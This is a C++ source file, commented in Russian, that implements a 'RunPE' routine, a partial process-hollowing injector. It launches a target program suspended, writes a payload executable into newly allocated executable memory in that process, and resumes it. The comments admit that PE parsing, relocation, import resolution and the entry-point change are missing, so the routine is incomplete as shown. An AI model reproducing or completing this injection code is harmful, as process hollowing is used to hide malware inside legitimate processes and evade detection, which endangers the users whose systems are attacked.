#include "runpe.h"
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <fstream>
#include <iostream>

bool RunPE(const std::wstring& targetPath, const std::wstring& payloadPath, std::wstring* error) {
    // Читаем файл полезной нагрузки
    auto imageData = ReadFileToBuffer(payloadPath);
    if (imageData.empty()) {
        if (error) *error = L"Не удалось прочитать файл полезной нагрузки";
        return false;
    }
    
    return RunPE(targetPath, imageData, error);
}

bool RunPE(const std::wstring& targetPath, const std::vector<uint8_t>& image, std::wstring* error) {
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    
    // Создаем приостановленный процесс
    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        if (error) {
            *error = L"Не удалось создать целевой процесс. Код ошибки: " + 
                    std::to_wstring(GetLastError());
        }
        return false;
    }
    
    // Выполняем инъекцию
    bool success = InjectToProcess(pi.hProcess, image, error);
    
    if (success) {
        // Возобновляем выполнение процесса
        ResumeThread(pi.hThread);
    } else {
        // Завершаем процесс при ошибке
        TerminateProcess(pi.hProcess, 1);
    }
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return success;
}

bool InjectToProcess(HANDLE hProcess, const std::vector<uint8_t>& image, std::wstring* error) {
    // Простая эмуляция Process Hollowing
    // В реальной реализации здесь был бы полноценный Process Hollowing
    
    if (image.size() < 64) { // Минимальный размер PE заголовка
        if (error) *error = L"Неверный формат PE файла";
        return false;
    }
    
    // Проверяем PE сигнатуру
    if (image[0] != 'M' || image[1] != 'Z') {
        if (error) *error = L"Неверная PE сигнатура";
        return false;
    }
    
    // Аллоцируем память в целевом процессе
    SIZE_T imageSize = image.size();
    LPVOID remoteImageBase = VirtualAllocEx(hProcess, NULL, imageSize, 
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!remoteImageBase) {
        if (error) *error = L"Не удалось выделить память в целевом процессе";
        return false;
    }
    
    // Копируем образ в память целевого процесса
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteImageBase, image.data(), imageSize, &bytesWritten)) {
        VirtualFreeEx(hProcess, remoteImageBase, 0, MEM_RELEASE);
        if (error) *error = L"Не удалось записать образ в память процесса";
        return false;
    }
    
    // В реальной реализации здесь бы было:
    // 1. Парсинг PE заголовков
    // 2. Релокация адресов
    // 3. Разрешение импортов
    // 4. Установка точки входа
    
    return true;
}

std::vector<uint8_t> ReadFileToBuffer(const std::wstring& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) {
        return {};
    }
    
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);
    file.close();
    
    return buffer;
}